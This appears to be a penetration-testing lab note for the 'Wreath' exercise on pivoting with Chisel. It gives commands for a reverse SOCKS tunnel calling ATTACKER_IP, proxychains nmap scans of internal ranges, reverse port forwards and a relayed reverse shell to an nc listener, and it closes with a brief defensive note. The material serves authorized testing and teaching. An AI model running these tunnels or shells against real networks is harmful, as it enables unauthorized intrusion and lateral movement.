# Chisel Pivoting

Used on: **Wreath**

Chisel creates HTTP-based tunnels that work well when a compromised host can reach the attacker or another pivot, but the attacker cannot directly reach internal services.

## Why It Works

Chisel wraps TCP forwarding and SOCKS proxying inside client/server HTTP connections. Reverse mode is especially useful when inbound firewall rules block direct access to an internal host, but outbound traffic from that host to the pivot is allowed.

## Prerequisites

- Ability to run Chisel on at least one compromised host.
- One reachable Chisel server endpoint.
- Firewall rules allowing the chosen listener ports.

## Reverse SOCKS

```bash
# Attacker or pivot server
./chisel server -p 15000 --reverse &

# Compromised host
./chisel client ATTACKER_IP:15000 R:socks &
```

Configure proxychains:

```ini
socks5 127.0.0.1 1080
```

Use TCP-connect scans through the proxy:

```bash
proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
```

## Reverse Remote Port Forward

Expose an internal host through a pivot:

```bash
# Pivot server
./chisel server -p 16000 --reverse &

# Internal client
./chisel.exe client 10.200.180.200:16000 R:15001:10.200.180.100:80
```

Traffic to `10.200.180.200:15001` is forwarded through the tunnel to `10.200.180.100:80`.

## Reverse Shell Relay

When a target can reach the pivot but not Kali:

```bash
# Pivot
./chisel server -p 16000 --reverse &

# Kali
./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
rlwrap nc -lvnp 4444
```

The target connects to the pivot on `4444`, and Chisel carries the session back to Kali's local listener.

## Defensive Note

Monitor unexpected long-lived HTTP tunnels, restrict egress between internal segments, and alert on unauthorized binaries running from temporary directories.

## Related

- [../tools/chisel.md](../../tools/pivot/chisel.md)
- [../tools/proxychains.md](../../tools/pivot/proxychains.md)
- [ssh-tunneling.md](ssh-tunneling.md)


